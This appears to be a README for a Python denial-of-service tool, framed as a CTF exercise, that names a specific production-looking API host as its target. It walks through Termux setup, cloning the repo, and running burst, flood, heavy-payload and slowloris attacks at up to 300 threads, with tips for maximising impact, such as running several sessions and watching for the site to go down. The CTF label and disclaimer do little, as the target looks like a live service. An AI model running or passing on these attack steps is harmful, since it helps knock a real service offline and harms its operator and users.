# DDoS Stress Test - CTF Challenge

> **Disclaimer**: This tool is for educational CTF purposes only. Do not use against systems you do not have permission to test.

## Target

```
https://hashu-apis-production-0857.up.railway.app/
```

## Setup in Termux

Follow these steps to install and run on your phone using Termux:

### Step 1: Install Termux

Download **Termux** from [F-Droid](https://f-droid.org/packages/com.termux/) (recommended) or your device's package manager.

### Step 2: Update Packages

```bash
pkg update && pkg upgrade -y
```

### Step 3: Install Python & Git

```bash
pkg install python git -y
```

### Step 4: Clone This Repository

```bash
git clone https://github.com/Alexdebron/Testforfun.git
cd Testforfun
```

### Step 5: Install Dependencies

```bash
pip install requests
```

### Step 6: Run the Attack

```bash
# Burst attack (recommended for CTF - fastest impact)
python3 ddos.py --method burst --threads 100 --duration 60

# Flood attack
python3 ddos.py --method flood --threads 50 --duration 60

# Heavy parameter attack
python3 ddos.py --method heavy --threads 20 --duration 60

# Slowloris attack
python3 ddos.py --method slowloris --threads 100 --duration 60

# All methods combined
python3 ddos.py --method all --threads 50 --duration 120

# Maximum intensity mode
python3 ddos.py --method burst --threads 300 --duration 120 --intense
```

## Attack Methods Explained

| Method | Description | Best For |
|--------|-------------|----------|
| **burst** | Maximum requests in minimum time | Quick takedown |
| **flood** | Continuous concurrent requests | Sustained pressure |
| **heavy** | Large payloads causing processing overhead | Resource exhaustion |
| **slowloris** | Keep connections open to exhaust pool | Connection limit |
| **all** | Runs all methods sequentially | Full stress test |

## Tips for CTF

1. **Use `--intense` flag** for maximum power (300 threads, 2 min)
2. **Open multiple Termux sessions** and run the script in each for more impact
3. **Monitor the target** in your browser while attacking to see if it goes down
4. **The target has no rate limiting** - more threads = more pressure
5. **Check response times** before/during/after attack to measure impact:
   ```bash
   curl -s --max-time 5 -w "Time: %{time_total}s\n" "https://hashu-apis-production-0857.up.railway.app/api/quote?apiKey=test"
   ```

## Arguments Reference

```
--threads N       Number of concurrent threads (default: 50)
--duration N      Duration in seconds (default: 60)
--method METHOD   Attack method: flood, heavy, burst, slowloris, all
--target URL      Custom target URL
--intense         Maximum intensity mode (300 threads, 120s)
```

## Expected Behavior

- Server processes every request even with invalid API keys
- 401 responses confirm requests are being processed
- 431 responses (heavy mode) confirm large payloads are being processed
- No rate limiting means unlimited request volume
- With enough concurrent requests, the Railway worker will be overwhelmed

## Troubleshooting

```bash
# If you get "Connection refused" - server might be down already!
# If Python crashes - reduce threads: --threads 50
# If network is slow - increase timeout in script
```
